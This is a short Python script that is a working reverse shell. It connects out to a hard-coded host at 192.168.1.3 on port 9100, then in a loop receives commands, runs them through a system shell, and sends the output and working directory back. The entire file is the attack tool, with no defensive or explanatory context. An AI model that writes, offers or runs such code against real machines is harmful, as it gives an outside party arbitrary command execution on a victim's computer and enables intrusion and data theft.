import os
import socket
import subprocess


sock = socket.socket()
host = '192.168.1.3'
port = 9100
sock.connect((host, port))

while True:
    data = sock.recv(1024)
    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, 'utf-8')
        sock.send(str.encode(output_str + str(os.getcwd()) + '> '))
        print(output_str)

# Close connection
sock.close()
